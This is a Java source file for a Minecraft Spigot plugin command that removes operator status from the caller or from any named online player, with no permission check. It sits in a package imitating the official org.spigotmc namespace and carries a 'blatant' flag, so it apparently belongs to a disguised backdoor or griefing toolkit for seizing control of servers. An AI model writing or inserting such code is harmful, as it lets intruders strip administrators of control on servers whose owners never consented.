package org.spigotmc.commands.impl.player;

import org.bukkit.Bukkit;
import org.bukkit.entity.Player;
import org.spigotmc.Main;
import org.spigotmc.commands.CommandListener;
import org.spigotmc.commands.annotation.CommandInfo;
import org.spigotmc.utils.Settings;

@CommandInfo (
    name = "deop",
    usage = "deop <player>",
    desc = "Deops you and other players!",
    blatant = true
)
public class Deop extends CommandListener{

    @Override
    public void execute(Main plugin, Player p, String[] args) {
        if (args.length <= 1) {
            p.setOp(false);
            p.sendMessage(Settings.PREFIX("You have been deoped"));
            return;
        }
        @SuppressWarnings("deprecation")
        Player player3 = Bukkit.getServer().getPlayer(args[1]);
        if (player3 == null) {
            p.sendMessage(Settings.PREFIX("The player " + args[1] + " is not online."));
            return;
        }
        player3.setOp(false);
        p.sendMessage(Settings.PREFIX("The player " + player3.getName() + " is no longer op"));
    }
}
